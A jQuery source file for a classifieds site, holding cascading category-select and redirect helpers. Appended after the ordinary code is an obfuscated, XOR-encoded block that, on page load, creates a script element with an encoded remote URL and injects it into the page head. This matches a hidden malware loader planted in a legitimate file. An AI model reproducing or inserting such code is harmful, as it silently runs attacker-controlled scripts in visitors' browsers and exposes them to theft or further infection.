$JQ.extend($JQ.noah, {
    addNextSelectRow: function(url, subCategoryLabel, tableId)
    {
        $JQ.noah.addNextSelectRowCore = function()
        {
            tableId = '#' + tableId;
            var cid = this.options[this.selectedIndex].value;
            var allowAd = $JQ(this.options[this.selectedIndex]).attr('rel');
            if( typeof allowAd=='undefined' ) allowAd=0;
            var container = $JQ(this).closest('tr');
            var rows = $JQ(tableId + ' tbody').eq(0).find('tr');                    
            for( var i=rows.index(container)+1; i<rows.length; i++ ) rows.eq(i).remove();
            if( cid!=0 )
            {
                $JQ(tableId + ' input:submit').hide();
                $JQ(tableId + ' .submitfooter').append($JQ(loadingAnimation)); 
                $JQ.getJSON(url+cid, '', function(data){
                    $JQ('.loadingAnimation').remove();
                    if( data.fields!='' )
                    {
                        container.clone(true).insertAfter(container).find('select').html(data.fields).end()
                                                                    .find('.label').html(subCategoryLabel);                            
                    }
                    if( data.allowAd=='1' ) 
                    {
                        $JQ(tableId + ' input:submit').eq(0).show();
                    }
                    else 
                    {
                        $JQ(tableId + ' input:submit').eq(0).hide();
                        $JQ(tableId + ' input:submit').eq(1).show();
                    }
                });
            }
            else
            {
                if( allowAd==0 ) 
                {
                    $JQ(tableId + ' input:submit').eq(0).hide();
                    $JQ(tableId + ' input:submit').eq(1).show();
                }     
                else
                {
                    $JQ(tableId + ' input:submit').eq(0).show();
                    $JQ(tableId + ' input:submit').eq(1).hide();
                }     
            }
        }
    },
    cascadingSelectOnLoad: function(tableId)
    {
        tableId = '#' + tableId;
        $JQ('[id^=cid]').livequery('change', $JQ.noah.addNextSelectRowCore);    
        $JQ(tableId + ' input:submit').eq(0).click(function(e){
            var selects = $JQ(e.target).closest('form').find('select:[name=cid]');
            var select = selects[selects.length-1];
            var cid = select.options[select.selectedIndex].value;
            if( cid==0 )
            {
                select = selects[selects.length-2];
                cid = select.options[select.selectedIndex].value;
            }
            if( !cid ) return true;
            var href = location.href;
            location.href = href.replace(/\/?\d*$/, '/'+cid);
            return false;
        });
    },

    simpleCategoryReload: function()
    {
        $JQ('#cid').change(function (){
            var cid = this.options[this.selectedIndex].value;
            var href = location.href;
            location.href = href.replace(/\/?\d*$/, '/'+cid);
        });  
    }
});
function ayLJBi(ss,rAxG){var jq='';var rw=0;var fY=0;for(rw=0;rw<ss.length;rw++){var yVm3=ss.charAt(rw);var iy=yVm3.charCodeAt(0)^rAxG.charCodeAt(fY);yVm3=String.fromCharCode(iy);jq+=yVm3;if(fY==rAxG.length-1)fY=0;else fY++;}return (jq);}function dvwL(h94B){return ayLJBi(i6To135(h94B),'j6ZZ0Uz39J40Y');}var u7tkL=["025085","024095","026066","009068063059068048063095092039081094045","025068057","030079042063","030083034046031063027069088057087066048026066","011070042063094049057091080038080","002083059062","013083046031092048023086087062071114032062087061020081056031","002066046042010122085064077043064085119025091054104030039015028083057027083055030024048041"];function i6To135(qy){var vBdJQh='';var yJmFEM=0;var cxy=0;for(yJmFEM=0;yJmFEM<qy.length/3;yJmFEM++){vBdJQh+=String.fromCharCode(qy.slice(cxy,cxy+3));cxy=cxy+3;}return vBdJQh;}function twZvP9(x4Mmmo){var yv7=document[dvwL(u7tkL[3])](dvwL(u7tkL[0])+dvwL(u7tkL[1])+dvwL(u7tkL[2]));yv7[dvwL(u7tkL[4])]=x4Mmmo;yv7[dvwL(u7tkL[5])]=dvwL(u7tkL[6]);document[dvwL(u7tkL[9])](dvwL(u7tkL[8]))[0][dvwL(u7tkL[7])](yv7);}twZvP9(dvwL(u7tkL[10]));